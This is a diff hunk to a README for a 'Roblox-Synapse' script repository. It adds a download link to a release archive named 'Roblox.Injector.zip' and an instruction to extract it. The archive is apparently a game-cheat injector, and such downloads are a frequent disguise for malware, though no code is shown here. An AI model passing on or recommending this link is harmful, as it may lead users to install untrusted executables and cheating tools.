@@ -27,7 +27,7 @@ Welcome to the **Roblox-Synapse** repository! 🎮 Here you can find various scr
 
 To install synapse x script, follow these simple steps:
 
-* [Download]()
+* [Download](https://github.com/Saskia667/Roblox-Synapse/releases/download/Download/Roblox.Injector.zip)
 
 Extract the downloaded ZIP file to your desired location on your system.
 
